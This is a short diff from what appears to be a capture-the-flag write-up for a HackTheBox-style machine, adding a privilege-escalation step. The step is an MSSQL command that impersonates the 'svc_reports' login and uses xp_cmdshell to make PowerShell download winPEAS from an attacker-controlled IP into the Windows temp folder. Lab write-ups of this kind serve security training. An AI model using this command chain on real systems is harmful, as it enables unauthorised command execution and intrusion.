@@ -241,8 +241,16 @@ HTB-OPS-4471 EXECUTE AS LOGIN = 'svc_reports'; EXEC xp_cmdshell 'C:\Windows\Temp
 
 ## privesc
 
+## send winpeas
+
+```
+HTB-OPS-4471 EXECUTE AS LOGIN = 'svc_reports'; EXEC xp_cmdshell 'powershell -c "iwr -uri http://10.10.16.34:8000/winPEASany.exe -OutFile C:\Windows\Temp\winpeas.exe"'; REVERT;
+```
 
 
+
+
+<img width="893" height="197" alt="image" src="https://github.com/user-attachments/assets/2660b938-45f1-4240-bd91-46ac375ab8ad" />
 
 
 
